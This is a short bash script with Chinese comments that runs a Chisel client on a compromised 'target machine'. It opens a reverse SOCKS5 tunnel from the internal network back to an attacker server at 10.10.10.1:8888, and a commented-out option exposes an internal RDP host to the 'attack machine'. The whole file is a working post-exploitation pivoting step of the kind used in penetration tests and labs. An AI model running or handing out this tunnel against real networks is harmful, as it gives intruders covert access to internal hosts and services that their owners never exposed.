#!/bin/bash
# Chisel 客户端启动脚本（在目标机器上执行）
# 服务端先执行：chisel server --reverse --port 8888

CHISEL_SERVER="10.10.10.1"
CHISEL_PORT="8888"

# 反向 SOCKS5 代理（将内网流量转发到攻击机 1080 端口）
./chisel client ${CHISEL_SERVER}:${CHISEL_PORT} R:1080:socks

# 或者指定端口转发（将内网 RDP 暴露到攻击机）
# ./chisel client ${CHISEL_SERVER}:${CHISEL_PORT} R:13389:192.168.1.100:3389
